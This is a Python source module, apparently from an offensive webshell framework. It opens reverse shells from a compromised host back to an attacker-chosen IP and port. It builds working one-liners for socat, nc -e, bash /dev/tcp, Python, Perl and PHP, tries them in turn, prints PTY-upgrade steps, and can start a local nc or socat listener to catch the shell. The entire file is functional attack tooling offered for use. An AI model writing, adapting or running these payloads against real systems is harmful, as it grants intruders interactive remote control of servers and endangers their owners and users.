"""Reverse shells via several techniques, with an optional local listener.

``auto`` tries methods in order of quality/likelihood (socat gives a real PTY;
the scripting fallbacks cover hosts where none of socat/nc/bash work).
"""

from __future__ import annotations

import contextlib
import shlex
import shutil
import subprocess
import threading
import time

from .. import log
from ..core.webshell import WebShell
from ..exceptions import ConnectionFailed, WebshellError

# Method name -> the binary we probe for with `which`.
_BINARY = {
    "socat": "socat", "nc": "nc", "bash": "bash",
    "python": "python3", "perl": "perl", "php": "php",
}
_AUTO_ORDER = ["socat", "nc", "bash", "python", "perl", "php"]


def _which(ws: WebShell, binary: str) -> str:
    try:
        out = ws.run_command(f"which {shlex.quote(binary)}").strip()
    except WebshellError:
        return ""
    return out.splitlines()[0] if out else ""


def _payload(method: str, binary: str, ip: str, port: str) -> str:
    if method == "socat":
        return f"{binary} tcp-connect:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane"
    if method == "nc":
        return f"{binary} -e /bin/sh {ip} {port}"
    if method == "bash":
        return f"{binary} -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
    if method == "python":
        return (
            f"{binary} -c 'import socket,subprocess,os;"
            f's=socket.socket();s.connect(("{ip}",{port}));'
            "[os.dup2(s.fileno(),f) for f in(0,1,2)];"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    if method == "perl":
        return (
            f"{binary} -e 'use Socket;$i=\"{ip}\";$p={port};"
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
        )
    if method == "php":
        return f"{binary} -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    raise ValueError(f"unknown reverse-shell method: {method}")


def reverse_shell(ws: WebShell, ip: str, port: int | str, method: str = "auto") -> bool:
    """Fire a reverse shell to ``ip:port``. Returns True once one fires.

    The HTTP request blocks while the shell lives, so a connection drop/timeout
    is the *expected* success path — have your listener ready first.
    """
    port = str(int(port))
    methods = _AUTO_ORDER if method == "auto" else [method]
    for name in methods:
        binary = _which(ws, _BINARY[name])
        if not binary and name == "python":
            binary = _which(ws, "python")
        if not binary:
            continue
        log.success(f"Trying {name} reverse shell ({binary}) -> {ip}:{port}")
        try:
            ws.run_command(_payload(name, binary, ip, port))
        except ConnectionFailed:
            log.success("Connection closed by the reverse shell (this is expected).")
            return True
        log.warning(f"{name} returned without connecting; trying next method.")
    log.error("No reverse-shell method succeeded.")
    return False


def pty_upgrade_hints(shell: str = "/bin/bash") -> str:
    """Return the canonical steps to upgrade a dumb reverse shell to a full PTY.

    The classic ``pty.spawn`` + ``stty raw -echo`` dance gives job control,
    tab-completion, arrow keys and a sane terminal. The local terminal's size is
    filled in so the remote ``stty`` matches your window.
    """
    size = shutil.get_terminal_size((80, 24))
    return "\n".join(
        [
            "PTY upgrade (run inside the reverse shell, then follow the local steps):",
            "  1. spawn a PTY (first that exists):",
            f"     python3 -c 'import pty; pty.spawn(\"{shell}\")'",
            f"     python  -c 'import pty; pty.spawn(\"{shell}\")'",
            f"     script -qc {shell} /dev/null",
            "  2. background it: press Ctrl-Z",
            "  3. on YOUR machine:    stty raw -echo; fg",
            "       (then press Enter twice)",
            "  4. back in the shell:  export TERM=xterm",
            f"     stty rows {size.lines} cols {size.columns}",
            "  Tip: restore your terminal afterwards with `reset` or `stty sane`.",
        ]
    )


def reverse_shell_with_listener(
    ws: WebShell, ip: str, port: int | str, method: str = "auto", tool: str = "nc"
) -> None:
    """Spawn a local listener, then fire the reverse shell into it.

    The payload is fired from a background thread (after a short delay so the
    listener is bound first); the listener runs in the foreground so you can
    interact with the shell.
    """
    port = str(int(port))
    if tool == "socat":
        listener: list[str] | str = f"socat file:`tty`,raw,echo=0 tcp-listen:{port}"
        shell = True
    else:
        listener, shell = ["nc", "-lvnp", port], False

    def _fire() -> None:
        time.sleep(1.0)
        with contextlib.suppress(Exception):
            reverse_shell(ws, ip, port, method)

    threading.Thread(target=_fire, daemon=True).start()
    log.success(f"Listening on :{port} ({tool}); the shell should connect shortly.")
    try:
        subprocess.run(listener, shell=shell)  # noqa: S602
    except FileNotFoundError:
        log.error(f"{tool} not found locally — start a listener manually (e.g. nc -lvnp {port}).")
